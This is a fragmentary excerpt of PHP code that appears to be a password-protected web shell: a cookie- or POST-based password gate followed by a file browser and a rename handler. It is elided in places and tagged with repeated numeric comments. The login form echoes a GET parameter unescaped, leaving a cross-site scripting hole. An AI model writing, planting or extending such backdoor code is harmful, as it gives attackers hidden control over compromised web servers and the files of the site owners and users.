...
$pass = false;
if (isset($_COOKIE['pw_name_91450'])) {
    if(($_COOKIE['pw_name_91450']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_91450'])) {
        if(($_POST['pw_name_91450']) == $auth_key) {
            setcookie("pw_name_91450", $_POST['pw_name_91450']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_91450' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774158445 1724682774145172 1724682774364438 1724682774738129
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774158445 1724682774145172 1724682774364438 1724682774738129
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774158445 1724682774145172 1724682774364438 1724682774738129
            $name = PATH . "/" . $_GET['r'];
